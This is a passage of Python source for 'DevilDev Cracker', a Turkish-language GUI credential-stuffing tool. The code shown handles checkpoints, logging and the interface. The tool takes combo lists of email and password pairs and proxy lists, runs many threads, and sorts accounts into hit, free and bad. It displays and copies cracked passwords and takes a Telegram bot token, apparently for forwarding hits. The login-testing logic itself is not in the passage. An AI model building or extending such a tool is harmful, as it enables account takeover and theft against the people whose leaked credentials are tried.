                self.history.append((time.time(), self.hits, self.free, self.bad))
                rate = (self.hits / self.total * 100) if self.total > 0 else 0
                self.rate_history.append((time.time(), rate))

    def get_stats(self):
        with self.lock:
            return self.total, self.hits, self.free, self.bad, self.retry

    def get_speed(self):
        elapsed = time.time() - self.start_time
        if elapsed == 0:
            return 0
        return self.total / elapsed

# ---------- Checkpoint Yönetimi ----------
CHECKPOINT_FILE = "devildev_checkpoint.pkl"

def save_checkpoint(processed_index, combo_file, total_combos, hit_data):
    data = {
        "processed_index": processed_index,
        "combo_file": combo_file,
        "total_combos": total_combos,
        "hit_data": hit_data,
        "timestamp": time.time()
    }
    with open(CHECKPOINT_FILE, "wb") as f:
        pickle.dump(data, f)

def load_checkpoint():
    if Path(CHECKPOINT_FILE).exists():
        try:
            with open(CHECKPOINT_FILE, "rb") as f:
                return pickle.load(f)
        except:
            pass
    return None

def clear_checkpoint():
    if Path(CHECKPOINT_FILE).exists():
        Path(CHECKPOINT_FILE).unlink()

# ---------- Log Yönetimi (Döndürme) ----------
class RotatingLogger:
    def __init__(self, log_file="devildev_log.txt", max_bytes=5*1024*1024, backup_count=3):
        self.log_file = log_file
        self.max_bytes = max_bytes
        self.backup_count = backup_count

    def write(self, message):
        if Path(self.log_file).exists() and Path(self.log_file).stat().st_size >= self.max_bytes:
            self.rotate()
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(message + "\n")

    def rotate(self):
        for i in range(self.backup_count - 1, 0, -1):
            src = f"{self.log_file}.{i}"
            dst = f"{self.log_file}.{i+1}"
            if Path(src).exists():
                Path(src).rename(dst)
        if Path(self.log_file).exists():
            Path(self.log_file).rename(f"{self.log_file}.1")
        Path(self.log_file).touch()

# ---------- Ana Uygulama v7.3 ----------
class DevilDevApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.config = load_config()
        self.lang = self.config.get("language", "tr")
        self.text = LANGUAGES[self.lang]

        self.title(self.text["title"])
        self.geometry("1400x980")
        self.configure(fg_color="#0a0a0a")
        self.resizable(True, True)
        self.minsize(1300, 850)

        self.color_theme = self.config.get("color_theme", "red")
        self.apply_color_theme()
        ctk.set_appearance_mode(self.config.get("theme", "Dark"))

        # Değişkenler
        self.combo_file = tk.StringVar(value=self.config.get("combo_file", ""))
        self.keyword_file = tk.StringVar(value=self.config.get("keyword_file", ""))
        self.proxy_file = tk.StringVar(value=self.config.get("proxy_file", ""))
        self.thread_count = tk.IntVar(value=self.config.get("thread_count", 20))
        self.checkpoint_interval = tk.IntVar(value=self.config.get("checkpoint_interval", 50))
        self.max_retry = tk.IntVar(value=self.config.get("max_retry", 3))
        self.tg_token = tk.StringVar(value=self.config.get("tg_token", ""))
        self.tg_chat = tk.StringVar(value=self.config.get("tg_chat", ""))
        self.sound_enabled = tk.BooleanVar(value=self.config.get("sound", True))
        self.sound_choice = tk.StringVar(value=self.config.get("sound_choice", "beep"))
        self.log_to_file = tk.BooleanVar(value=self.config.get("log_to_file", False))
        self.checkpoint_enabled = tk.BooleanVar(value=self.config.get("checkpoint_enabled", True))
        self.tray_enabled = tk.BooleanVar(value=self.config.get("tray_enabled", True))

        self.running = False
        self.stop_event = threading.Event()
        self.worker_threads = []
        self.msg_queue = queue.Queue()
        self.stats = Stats()
        self.notifier = None
        self.total_combos = 0
        self.hit_data = []
        self.processed_count = 0
        self.current_combo_path = ""

        self.total_hits = 0
        self.total_free = 0
        self.total_bad = 0
        self.total_retry = 0

        self.current_filter = "ALL"
        self.regex_filter = tk.StringVar(value="")
        self.search_query = tk.StringVar(value="")
        self.proxy_list = []

        # Grafikler
        self.fig = Figure(figsize=(6.5, 3.2), dpi=100, facecolor="#121212")
        self.ax1 = self.fig.add_subplot(121)
        self.ax2 = self.fig.add_subplot(122)
        self.ax1.set_facecolor("#1a1a1a")
        self.ax2.set_facecolor("#1a1a1a")
        self.ax1.tick_params(colors="#aaaaaa")
        self.ax2.tick_params(colors="#aaaaaa")
        for ax in (self.ax1, self.ax2):
            ax.spines['bottom'].set_color('#555555')
            ax.spines['left'].set_color('#555555')
            ax.spines['top'].set_visible(False)
            ax.spines['right'].set_visible(False)
            ax.grid(color='#2a2a2a', linestyle='--', linewidth=0.5)

        self.line_hit, = self.ax1.plot([], [], label="Hit", color="#00ff66", linewidth=2.5)
        self.line_free, = self.ax1.plot([], [], label="Free", color="#ffcc00", linewidth=2.5)
        self.line_bad, = self.ax1.plot([], [], label="Bad", color="#ff003c", linewidth=2.5)
        self.ax1.legend(loc="upper left", facecolor="#1a1a1a", labelcolor="#ffffff", framealpha=0.8)
        self.ax1.set_title("Zaman Serisi", color="#ffffff", fontsize=10)

        self.line_rate, = self.ax2.plot([], [], label="Başarı Oranı", color="#ff8800", linewidth=2.5)
        self.ax2.legend(loc="upper left", facecolor="#1a1a1a", labelcolor="#ffffff", framealpha=0.8)
        self.ax2.set_title("Başarı Oranı Zaman Serisi", color="#ffffff", fontsize=10)
        self.ax2.set_ylim(0, 100)

        self.create_widgets()
        self.update_gui()
        self.protocol("WM_DELETE_WINDOW", self.on_close)

        self.bind("<Control-Return>", lambda e: self.start_cracking())
        self.bind("<Control-s>", lambda e: self.stop_cracking())
        self.bind("<Control-o>", lambda e: self.browse_combo())
        self.bind("<Control-k>", lambda e: self.browse_keyword())

        self.tray_icon = None
        if self.tray_enabled.get() and HAS_TRAY:
            self.setup_tray()

        self.check_for_checkpoint()

    def apply_color_theme(self):
        themes = {
            "red": {"fg": "#ff003c", "hover": "#cc0030", "light": "#ff3366"},
            "blue": {"fg": "#0066ff", "hover": "#0044cc", "light": "#3399ff"},
            "green": {"fg": "#00cc66", "hover": "#00994d", "light": "#33ff88"},
            "purple": {"fg": "#9b59b6", "hover": "#8e44ad", "light": "#bb77dd"}
        }
        self.primary_color = themes.get(self.color_theme, themes["red"])
        self.configure(fg_color="#0a0a0a")

    def setup_tray(self):
        try:
            image = Image.new('RGB', (64, 64), color='#0d0d0d')
            draw = ImageDraw.Draw(image)
            draw.ellipse((16, 16, 48, 48), fill='#ff003c')
            menu = pystray.Menu(
                pystray.MenuItem(self.text["tray_show"], self.show_window),
                pystray.MenuItem(self.text["tray_hide"], self.hide_window),
                pystray.MenuItem(self.text["tray_exit"], self.quit_app)
            )
            self.tray_icon = pystray.Icon("devildev", image, "DevilDev Cracker", menu)
            threading.Thread(target=self.tray_icon.run, daemon=True).start()
        except Exception:
            self.tray_icon = None

    def show_window(self):
        self.deiconify()
        self.lift()

    def hide_window(self):
        self.iconify()

    def quit_app(self):
        if self.tray_icon:
            self.tray_icon.stop()
        self.destroy()

    def on_close(self):
        self.save_config()
        if hasattr(self, 'tray_icon') and self.tray_icon:
            self.tray_icon.stop()
        self.destroy()

    def save_config(self):
        self.config["combo_file"] = self.combo_file.get()
        self.config["keyword_file"] = self.keyword_file.get()
        self.config["proxy_file"] = self.proxy_file.get()
        self.config["thread_count"] = self.thread_count.get()
        self.config["checkpoint_interval"] = self.checkpoint_interval.get()
        self.config["max_retry"] = self.max_retry.get()
        self.config["tg_token"] = self.tg_token.get()
        self.config["tg_chat"] = self.tg_chat.get()
        self.config["theme"] = ctk.get_appearance_mode()
        self.config["sound"] = self.sound_enabled.get()
        self.config["language"] = self.lang
        self.config["color_theme"] = self.color_theme
        self.config["sound_choice"] = self.sound_choice.get()
        self.config["log_to_file"] = self.log_to_file.get()
        self.config["checkpoint_enabled"] = self.checkpoint_enabled.get()
        self.config["tray_enabled"] = self.tray_enabled.get()
        save_config(self.config)

    def toggle_theme(self):
        current = ctk.get_appearance_mode()
        new = "Dark" if current == "Light" else "Light"
        ctk.set_appearance_mode(new)
        self.save_config()

    def change_language(self, lang_code):
        self.lang = lang_code
        self.text = LANGUAGES[lang_code]
        self.title(self.text["title"])
        self.save_config()
        self.update_texts()

    def update_texts(self):
        self.lbl_combo.configure(text=self.text["combo_label"])
        self.lbl_keyword.configure(text=self.text["keyword_label"])
        self.lbl_proxy_list.configure(text=self.text["proxy_list_label"])
        self.lbl_checkpoint_interval.configure(text=self.text["checkpoint_interval_label"])
        self.lbl_retry.configure(text=self.text["retry_label"])
        self.start_btn.configure(text=self.text["start_btn"])
        self.stop_btn.configure(text=self.text["stop_btn"])
        self.export_btn.configure(text=self.text["export_btn"])
        self.filter_all.configure(text=self.text["filter_all"])
        self.filter_hit.configure(text=self.text["hit"])
        self.filter_free.configure(text=self.text["free"])
        self.filter_bad.configure(text=self.text["bad"])
        self.lbl_sound.configure(text=self.text["sound_label"])
        self.lbl_checkpoint.configure(text=self.text["checkpoint_label"])
        self.lbl_regex_filter.configure(text=self.text["filter_regex"])
        self.search_entry.configure(placeholder_text=self.text["search_placeholder"])

    def create_widgets(self):
        # Üst çubuk
        top_bar = ctk.CTkFrame(self, fg_color="transparent", height=70)
        top_bar.pack(fill="x", padx=25, pady=10)

        logo_text = (
            "██████╗ ███████╗██╗   ██╗██╗██╗\n"
            "██╔══██╗██╔════╝██║   ██║██║██║\n"
            "██║  ██║█████╗  ██║   ██║██║██║\n"
            "██║  ██║██╔══╝  ╚██╗ ██╔╝██║██║\n"
            "██████╔╝███████╗ ╚████╔╝ ██║███████╗\n"
            "╚═════╝ ╚══════╝  ╚═══╝  ╚═╝╚══════╝"
        )
        lbl_logo = ctk.CTkLabel(top_bar, text=logo_text, font=("Consolas", 11, "bold"), text_color=self.primary_color["fg"])
        lbl_logo.pack(side="left")

        right_top = ctk.CTkFrame(top_bar, fg_color="transparent")
        right_top.pack(side="right")

        lang_menu = ctk.CTkOptionMenu(right_top, values=["tr", "en"], command=self.change_language, width=70)
        lang_menu.set(self.lang)
        lang_menu.pack(side="left", padx=5)

        theme_btn = ctk.CTkButton(right_top, text="🌓", width=40, command=self.toggle_theme, fg_color="#333", hover_color="#555")
        theme_btn.pack(side="left", padx=5)

        color_menu = ctk.CTkOptionMenu(right_top, values=["red", "blue", "green", "purple"], command=self.change_color_theme, width=90)
        color_menu.set(self.color_theme)
        color_menu.pack(side="left", padx=5)

        sound_check = ctk.CTkCheckBox(right_top, text="🔊", variable=self.sound_enabled, text_color="#ffffff", font=("Arial", 14))
        sound_check.pack(side="left", padx=5)

        ctk.CTkLabel(right_top, text="Ctrl+Enter Başlat", font=("Arial", 9), text_color="#888").pack(side="left", padx=5)

        # Ana Çerçeve
        main_frame = ctk.CTkFrame(self, fg_color="#121212", corner_radius=12)
        main_frame.pack(fill="both", expand=True, padx=25, pady=10)

        # SOL PANEL
        left_panel = ctk.CTkFrame(main_frame, fg_color="transparent", width=420)
        left_panel.pack(side="left", fill="y", padx=10, pady=10)
        left_panel.pack_propagate(False)

        # Dosya seçimi
        file_box = ctk.CTkFrame(left_panel, fg_color="#1e1e1e", corner_radius=10, border_width=1, border_color="#333")
        file_box.pack(fill="x", pady=5)

        self.lbl_combo = ctk.CTkLabel(file_box, text=self.text["combo_label"], text_color="#dddddd", font=("Arial", 11, "bold"))
        self.lbl_combo.grid(row=0, column=0, sticky="w", padx=10, pady=5)
        ctk.CTkEntry(file_box, textvariable=self.combo_file, width=240, fg_color="#0d0d0d", border_color=self.primary_color["fg"]).grid(row=0, column=1, padx=5, pady=5)
        ctk.CTkButton(file_box, text="📂", width=40, fg_color=self.primary_color["fg"], hover_color=self.primary_color["hover"], command=self.browse_combo).grid(row=0, column=2, padx=5)

        self.lbl_keyword = ctk.CTkLabel(file_box, text=self.text["keyword_label"], text_color="#dddddd", font=("Arial", 11, "bold"))
        self.lbl_keyword.grid(row=1, column=0, sticky="w", padx=10, pady=5)
        ctk.CTkEntry(file_box, textvariable=self.keyword_file, width=240, fg_color="#0d0d0d", border_color=self.primary_color["fg"]).grid(row=1, column=1, padx=5, pady=5)
        ctk.CTkButton(file_box, text="📂", width=40, fg_color=self.primary_color["fg"], hover_color=self.primary_color["hover"], command=self.browse_keyword).grid(row=1, column=2, padx=5)

        # Proxy
        proxy_frame = ctk.CTkFrame(left_panel, fg_color="#1e1e1e", corner_radius=10, border_width=1, border_color="#333")
        proxy_frame.pack(fill="x", pady=5)

        self.lbl_proxy_list = ctk.CTkLabel(proxy_frame, text=self.text["proxy_list_label"], text_color="#dddddd", font=("Arial", 11, "bold"))
        self.lbl_proxy_list.grid(row=0, column=0, sticky="w", padx=10, pady=5)
        ctk.CTkEntry(proxy_frame, textvariable=self.proxy_file, width=240, fg_color="#0d0d0d", border_color=self.primary_color["fg"]).grid(row=0, column=1, padx=5, pady=5)
        ctk.CTkButton(proxy_frame, text="📂", width=40, fg_color=self.primary_color["fg"], hover_color=self.primary_color["hover"], command=self.browse_proxy).grid(row=0, column=2, padx=5)

        # Threads, Checkpoint Aralığı, Retry
        settings_frame = ctk.CTkFrame(left_panel, fg_color="#1e1e1e", corner_radius=10, border_width=1, border_color="#333")
        settings_frame.pack(fill="x", pady=5)

        ctk.CTkLabel(settings_frame, text=self.text["threads_label"], text_color="#dddddd", font=("Arial", 11, "bold")).grid(row=0, column=0, sticky="w", padx=10, pady=5)
        ctk.CTkButton(settings_frame, text="−", width=30, fg_color="#333", hover_color="#555", command=lambda: self.thread_count.set(max(1, self.thread_count.get()-1))).grid(row=0, column=1, padx=2)
        ctk.CTkSlider(settings_frame, from_=1, to=50, variable=self.thread_count, width=100, progress_color=self.primary_color["fg"]).grid(row=0, column=2, padx=5)
        ctk.CTkButton(settings_frame, text="+", width=30, fg_color="#333", hover_color="#555", command=lambda: self.thread_count.set(min(50, self.thread_count.get()+1))).grid(row=0, column=3, padx=2)
        ctk.CTkLabel(settings_frame, textvariable=self.thread_count, width=30, text_color="#ffffff").grid(row=0, column=4, padx=5)

        self.lbl_checkpoint_interval = ctk.CTkLabel(settings_frame, text=self.text["checkpoint_interval_label"], text_color="#dddddd", font=("Arial", 11, "bold"))
        self.lbl_checkpoint_interval.grid(row=1, column=0, sticky="w", padx=10, pady=5)
        ctk.CTkEntry(settings_frame, textvariable=self.checkpoint_interval, width=80, fg_color="#0d0d0d", border_color=self.primary_color["fg"]).grid(row=1, column=1, padx=5, pady=5)

        self.lbl_retry = ctk.CTkLabel(settings_frame, text=self.text["retry_label"], text_color="#dddddd", font=("Arial", 11, "bold"))
        self.lbl_retry.grid(row=1, column=2, sticky="w", padx=10, pady=5)
        ctk.CTkEntry(settings_frame, textvariable=self.max_retry, width=80, fg_color="#0d0d0d", border_color=self.primary_color["fg"]).grid(row=1, column=3, padx=5, pady=5)

        # Ses
        sound_frame = ctk.CTkFrame(left_panel, fg_color="#1e1e1e", corner_radius=10, border_width=1, border_color="#333")
        sound_frame.pack(fill="x", pady=5)

        self.lbl_sound = ctk.CTkLabel(sound_frame, text=self.text["sound_label"], text_color="#dddddd", font=("Arial", 11, "bold"))
        self.lbl_sound.pack(anchor="w", padx=10, pady=2)
        sound_menu = ctk.CTkOptionMenu(sound_frame, values=["beep", "ding", "buzz", "silent"], variable=self.sound_choice, width=120, fg_color="#0d0d0d", button_color=self.primary_color["fg"])
        sound_menu.pack(padx=10, pady=5)

        # Misc (Combo Editör, Checkpoint, Tepsi)
        misc_frame = ctk.CTkFrame(left_panel, fg_color="#1e1e1e", corner_radius=10, border_width=1, border_color="#333")
        misc_frame.pack(fill="x", pady=5)

        ctk.CTkButton(misc_frame, text="✏️ Combo", width=90, fg_color="#333", hover_color="#555", command=self.open_combo_editor).pack(side="left", padx=10, pady=5)

        self.lbl_checkpoint = ctk.CTkLabel(misc_frame, text=self.text["checkpoint_label"], text_color="#dddddd", font=("Arial", 11))
        self.lbl_checkpoint.pack(side="left", padx=10)
        ctk.CTkCheckBox(misc_frame, variable=self.checkpoint_enabled, text="", text_color="#ffffff").pack(side="left", padx=5)

        tray_check = ctk.CTkCheckBox(misc_frame, text="Tepsi", variable=self.tray_enabled, text_color="#ffffff", font=("Arial", 11))
        tray_check.pack(side="left", padx=10)

        # Telegram
        telegram_frame = ctk.CTkFrame(left_panel, fg_color="#1e1e1e", corner_radius=10, border_width=1, border_color="#333")
        telegram_frame.pack(fill="x", pady=5)

        ctk.CTkLabel(telegram_frame, text=self.text["telegram_token"], text_color="#dddddd", font=("Arial", 11, "bold")).grid(row=0, column=0, sticky="w", padx=10, pady=5)
        ctk.CTkEntry(telegram_frame, textvariable=self.tg_token, width=250, fg_color="#0d0d0d", border_color=self.primary_color["fg"]).grid(row=0, column=1, padx=5, pady=5, columnspan=3)

        ctk.CTkLabel(telegram_frame, text=self.text["telegram_chat"], text_color="#dddddd", font=("Arial", 11, "bold")).grid(row=1, column=0, sticky="w", padx=10, pady=5)
        ctk.CTkEntry(telegram_frame, textvariable=self.tg_chat, width=250, fg_color="#0d0d0d", border_color=self.primary_color["fg"]).grid(row=1, column=1, padx=5, pady=5, columnspan=3)

        # Log dosyası
        log_check = ctk.CTkCheckBox(left_panel, text=self.text["log_to_file"], variable=self.log_to_file, text_color="#dddddd", font=("Arial", 11))
        log_check.pack(anchor="w", padx=15, pady=2)

        # Butonlar
        btn_box = ctk.CTkFrame(left_panel, fg_color="transparent")
        btn_box.pack(fill="x", pady=10)

        self.start_btn = ctk.CTkButton(btn_box, text=self.text["start_btn"], fg_color=self.primary_color["fg"], hover_color=self.primary_color["hover"], font=("Arial", 14, "bold"), height=45, corner_radius=8, command=self.start_cracking)
        self.start_btn.pack(fill="x", pady=5)

        self.stop_btn = ctk.CTkButton(btn_box, text=self.text["stop_btn"], fg_color="#444444", hover_color="#222222", font=("Arial", 14, "bold"), height=35, corner_radius=8, state="disabled", command=self.stop_cracking)
        self.stop_btn.pack(fill="x", pady=5)

        # Progress
        self.progress = ctk.CTkProgressBar(left_panel, width=350, progress_color=self.primary_color["fg"], corner_radius=6)
        self.progress.pack(fill="x", pady=5)
        self.progress.set(0)
        self.lbl_progress = ctk.CTkLabel(left_panel, text="0%", text_color="#aaaaaa", font=("Arial", 12))
        self.lbl_progress.pack(pady=2)

        # Hız, ETA, Başarı Oranı
        info_frame = ctk.CTkFrame(left_panel, fg_color="transparent")
        info_frame.pack(fill="x", pady=5)

        self.lbl_speed = ctk.CTkLabel(info_frame, text=f"{self.text['speed']} 0 combo/s", text_color="#aaaaaa", font=("Arial", 11))
        self.lbl_speed.pack(side="left", padx=5)

        self.lbl_eta = ctk.CTkLabel(info_frame, text=f"{self.text['eta']} ∞", text_color="#aaaaaa", font=("Arial", 11))
        self.lbl_eta.pack(side="right", padx=5)

        self.lbl_rate = ctk.CTkLabel(left_panel, text=f"{self.text['success_rate']} 0.0%", text_color="#ffcc00", font=("Arial", 13, "bold"))
        self.lbl_rate.pack(pady=5)

        # Export
        self.export_btn = ctk.CTkButton(left_panel, text=self.text["export_btn"], fg_color="#333333", hover_color="#555555", font=("Arial", 11), command=self.export_stats)
        self.export_btn.pack(fill="x", pady=5)

        # SAĞ ÜST PANEL (Kartlar + Grafik)
        right_top = ctk.CTkFrame(main_frame, fg_color="transparent")
        right_top.pack(side="top", fill="both", expand=True, padx=10, pady=5)

        stats_grid = ctk.CTkFrame(right_top, fg_color="transparent")
        stats_grid.pack(side="top", fill="x", pady=5)

        self.box_hit = self.create_stat_card(stats_grid, self.text["hit"], "0", "#00ff66", 0, 0)
        self.box_free = self.create_stat_card(stats_grid, self.text["free"], "0", "#ffcc00", 0, 1)
        self.box_bad = self.create_stat_card(stats_grid, self.text["bad"], "0", "#ff003c", 0, 2)
        self.box_retry = self.create_stat_card(stats_grid, self.text["retry"], "0", "#00ccff", 0, 3)
        self.box_total = self.create_stat_card(stats_grid, self.text["total"], "0", "#aaaaaa", 1, 0)
        self.box_cpm = self.create_stat_card(stats_grid, self.text["cpm"], "0", "#ffffff", 1, 1)
        self.box_success = self.create_stat_card(stats_grid, self.text["success_rate"], "0%", "#ff8800", 1, 2)
        self.box_status = self.create_stat_card(stats_grid, self.text["status"], self.text["ready"], "#00ccff", 1, 3)

        # Grafik
        canvas_frame = ctk.CTkFrame(right_top, fg_color="#1a1a1a", corner_radius=10, border_width=1, border_color="#333")
        canvas_frame.pack(side="bottom", fill="both", expand=True, pady=5)

        self.canvas = FigureCanvasTkAgg(self.fig, master=canvas_frame)
        self.canvas.get_tk_widget().pack(fill="both", expand=True, padx=5, pady=5)

        # SAĞ ALT PANEL (Filtre + Arama + Tablo + Log)
        right_bottom = ctk.CTkFrame(main_frame, fg_color="transparent")
        right_bottom.pack(side="bottom", fill="both", expand=True, padx=10, pady=5)

        filter_frame = ctk.CTkFrame(right_bottom, fg_color="transparent")
        filter_frame.pack(fill="x", pady=2)

        self.lbl_regex_filter = ctk.CTkLabel(filter_frame, text=self.text["filter_regex"], text_color="#dddddd", font=("Arial", 11))
        self.lbl_regex_filter.pack(side="left", padx=5)

        regex_entry = ctk.CTkEntry(filter_frame, textvariable=self.regex_filter, width=160, placeholder_text=self.text["filter_placeholder"], fg_color="#0d0d0d", border_color="#555")
        regex_entry.pack(side="left", padx=5)
        regex_entry.bind("<KeyRelease>", lambda e: self.update_table())

        ctk.CTkLabel(filter_frame, text="Tip:", text_color="#dddddd", font=("Arial", 11)).pack(side="left", padx=10)

        self.filter_all = ctk.CTkButton(filter_frame, text=self.text["filter_all"], width=55, fg_color="#333", hover_color="#555", command=lambda: self.set_filter("ALL"))
        self.filter_all.pack(side="left", padx=2)
        self.filter_hit = ctk.CTkButton(filter_frame, text=self.text["hit"], width=55, fg_color="#333", hover_color="#555", command=lambda: self.set_filter("HIT"))
        self.filter_hit.pack(side="left", padx=2)
        self.filter_free = ctk.CTkButton(filter_frame, text=self.text["free"], width=55, fg_color="#333", hover_color="#555", command=lambda: self.set_filter("FREE"))
        self.filter_free.pack(side="left", padx=2)
        self.filter_bad = ctk.CTkButton(filter_frame, text=self.text["bad"], width=55, fg_color="#333", hover_color="#555", command=lambda: self.set_filter("BAD"))
        self.filter_bad.pack(side="left", padx=2)

        # Arama
        ctk.CTkLabel(filter_frame, text="🔍", text_color="#dddddd", font=("Arial", 14)).pack(side="left", padx=10)
        self.search_entry = ctk.CTkEntry(filter_frame, textvariable=self.search_query, width=160, placeholder_text=self.text["search_placeholder"], fg_color="#0d0d0d", border_color="#555")
        self.search_entry.pack(side="left", padx=5)
        self.search_entry.bind("<KeyRelease>", lambda e: self.update_table())

        # Tablo + Log
        table_log_frame = ctk.CTkFrame(right_bottom, fg_color="transparent")
        table_log_frame.pack(fill="both", expand=True, pady=5)

        # Tablo
        table_frame = ctk.CTkFrame(table_log_frame, fg_color="#1a1a1a", corner_radius=10, border_width=1, border_color="#333")
        table_frame.pack(side="left", fill="both", expand=True, padx=5)

        ctk.CTkLabel(table_frame, text=self.text["results_table"], font=("Arial", 12, "bold"), text_color=self.primary_color["fg"]).pack(anchor="w", padx=10, pady=2)

        tree_frame = tk.Frame(table_frame, bg="#1a1a1a")
        tree_frame.pack(fill="both", expand=True, padx=5, pady=5)

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Treeview", background="#1a1a1a", foreground="#ffffff", fieldbackground="#1a1a1a", rowheight=26)
        style.map('Treeview', background=[('selected', self.primary_color["fg"])])
        style.configure("Treeview.Heading", background="#2a2a2a", foreground="#ffffff", font=('Arial', 10, 'bold'))

        self.tree = ttk.Treeview(tree_frame, columns=("Type", "Email", "Password", "Match"), show="headings", height=12)
        self.tree.heading("Type", text="Tip")
        self.tree.heading("Email", text="Email")
        self.tree.heading("Password", text="Şifre")
        self.tree.heading("Match", text="Eşleşen Keyword")
        self.tree.column("Type", width=60, anchor="center")
        self.tree.column("Email", width=200)
        self.tree.column("Password", width=120)
        self.tree.column("Match", width=220)
        self.tree.pack(fill="both", expand=True)

        for col in ["Type", "Email", "Password", "Match"]:
            self.tree.heading(col, command=lambda c=col: self.sort_tree(c))

        scroll = ttk.Scrollbar(tree_frame, orient="vertical", command=self.tree.yview)
        scroll.pack(side="right", fill="y")
        self.tree.configure(yscrollcommand=scroll.set)

        self.tree_menu = tk.Menu(self.tree, tearoff=0, bg="#2a2a2a", fg="#ffffff")
        self.tree_menu.add_command(label=self.text["copy_email"], command=self.copy_email)
        self.tree_menu.add_command(label=self.text["copy_password"], command=self.copy_password)
        self.tree_menu.add_command(label=self.text["copy_row"], command=self.copy_row)
        self.tree_menu.add_separator()
        self.tree_menu.add_command(label=self.text["delete_row"], command=self.delete_row)
        self.tree.bind("<Button-3>", self.show_tree_menu)

        # Log
        log_frame = ctk.CTkFrame(table_log_frame, fg_color="#1a1a1a", corner_radius=10, border_width=1, border_color="#333")
        log_frame.pack(side="right", fill="both", expand=True, padx=5)

        log_header = ctk.CTkFrame(log_frame, fg_color="transparent")
        log_header.pack(fill="x", padx=5, pady=2)

        ctk.CTkLabel(log_header, text=self.text["live_log"], font=("Consolas", 12, "bold"), text_color=self.primary_color["fg"]).pack(side="left")
        ctk.CTkButton(log_header, text=self.text["clear"], width=80, fg_color="#333333", hover_color="#555555", command=self.clear_log).pack(side="right")

        self.log_box = ctk.CTkTextbox(log_frame, fg_color="#0d0d0d", text_color="#00ff66", font=("Consolas", 9), corner_radius=5)
        self.log_box.pack(fill="both", expand=True, padx=5, pady=5)
        self.log_box.configure(state="disabled")

        # Renk etiketleri (font kaldırıldı, sadece renk)
        self.log_box.tag_config("hit", foreground="#00ff66")
        self.log_box.tag_config("free", foreground="#ffcc00")
        self.log_box.tag_config("bad", foreground="#ff003c")
        self.log_box.tag_config("info", foreground="#00ccff")
        self.log_box.tag_config("retry", foreground="#ff8800")
        self.log_box.tag_config("checkpoint", foreground="#ff8800")

        self.logger = RotatingLogger() if self.log_to_file.get() else None

    # ---------- Yardımcı ----------
    def create_stat_card(self, parent, title, value, color, row, col):
        card = ctk.CTkFrame(parent, fg_color="#1a1a1a", corner_radius=10, width=150, height=80, border_width=1, border_color="#333")
        card.grid(row=row, column=col, padx=6, pady=6)
        card.grid_propagate(False)

        def on_enter(e):
            card.configure(border_color=color, fg_color="#2a2a2a")
        def on_leave(e):
            card.configure(border_color="#333", fg_color="#1a1a1a")
        card.bind("<Enter>", on_enter)
        card.bind("<Leave>", on_leave)

        ctk.CTkLabel(card, text=title, font=("Arial", 11, "bold"), text_color="#888888").pack(anchor="w", padx=10, pady=2)
        val_label = ctk.CTkLabel(card, text=value, font=("Arial", 20, "bold"), text_color=color)
        val_label.pack(anchor="w", padx=10)
        return val_label

    def browse_combo(self):
        filename = filedialog.askopenfilename(title="Combo Dosyası Seç", filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")])
        if filename:
            self.combo_file.set(filename)
            self.current_combo_path = filename

    def browse_keyword(self):
        filename = filedialog.askopenfilename(title="Keyword Dosyası Seç", filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")])
        if filename:
            self.keyword_file.set(filename)

    def browse_proxy(self):
        filename = filedialog.askopenfilename(title="Proxy Listesi Seç", filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")])
        if filename:
            self.proxy_file.set(filename)
            self.load_proxy_list(filename)

    def load_proxy_list(self, filename):
        self.proxy_list = []
        try:
            with open(filename, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        self.proxy_list.append(line)
        except Exception:
            self.proxy_list = []

    def get_random_proxy(self):
        if self.proxy_list:
            return random.choice(self.proxy_list)
        return None

    def clear_log(self):
        self.log_box.configure(state="normal")
        self.log_box.delete("1.0", "end")
        self.log_box.configure(state="disabled")

    def log(self, message, tag=None):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_box.configure(state="normal")
        if tag:
            self.log_box.insert("end", f"[{timestamp}] {message}\n", tag)
        else:
            self.log_box.insert("end", f"[{timestamp}] {message}\n")
        self.log_box.see("end")
        self.log_box.configure(state="disabled")

        if self.log_to_file.get():
            if self.logger:
                self.logger.write(f"[{timestamp}] {message}")
            else:
                try:
                    with open("devildev_log.txt", "a", encoding="utf-8") as f:
                        f.write(f"[{timestamp}] {message}\n")
                except:
                    pass

    def set_filter(self, ftype):
        self.current_filter = ftype
        for btn in [self.filter_all, self.filter_hit, self.filter_free, self.filter_bad]:
            btn.configure(fg_color="#333", hover_color="#555")
        if ftype == "ALL":
            self.filter_all.configure(fg_color=self.primary_color["fg"], hover_color=self.primary_color["hover"])
        elif ftype == "HIT":
            self.filter_hit.configure(fg_color=self.primary_color["fg"], hover_color=self.primary_color["hover"])
        elif ftype == "FREE":
            self.filter_free.configure(fg_color=self.primary_color["fg"], hover_color=self.primary_color["hover"])
        elif ftype == "BAD":
            self.filter_bad.configure(fg_color=self.primary_color["fg"], hover_color=self.primary_color["hover"])
        self.update_table()

    def update_table(self):
        for item in self.tree.get_children():
            self.tree.delete(item)

        regex = self.regex_filter.get().strip()
        pattern = None
        if regex:
            try:
                pattern = re.compile(regex, re.IGNORECASE)
            except:
                pattern = None

        search = self.search_query.get().strip().lower()

        for row in self.hit_data:
            typ = row[0]
            email = row[1]
            if self.current_filter != "ALL" and typ != self.current_filter:
                continue
            if pattern and not pattern.search(email):
                continue
            if search and search not in email.lower():
                continue
            self.tree.insert("", "end", values=row)

    def add_to_table(self, typ, email, password, match_str):
        self.hit_data.insert(0, (typ, email, password, match_str))
        self.update_table()

    def sort_tree(self, col):
        items = [(self.tree.set(k, col), k) for k in self.tree.get_children('')]
        items.sort()
        for index, (val, k) in enumerate(items):
            self.tree.move(k, '', index)

    # ---------- Sağ Tık ----------
    def show_tree_menu(self, event):
        item = self.tree.identify_row(event.y)
        if item:
            self.tree.selection_set(item)
            self.tree_menu.post(event.x_root, event.y_root)

    def copy_email(self):
        selected = self.tree.selection()
        if selected:
            values = self.tree.item(selected[0], "values")
            self.clipboard_clear()
            self.clipboard_append(values[1])
            self.log("[INFO] Email kopyalandı", "info")

    def copy_password(self):
        selected = self.tree.selection()
        if selected:
            values = self.tree.item(selected[0], "values")
            self.clipboard_clear()
            self.clipboard_append(values[2])
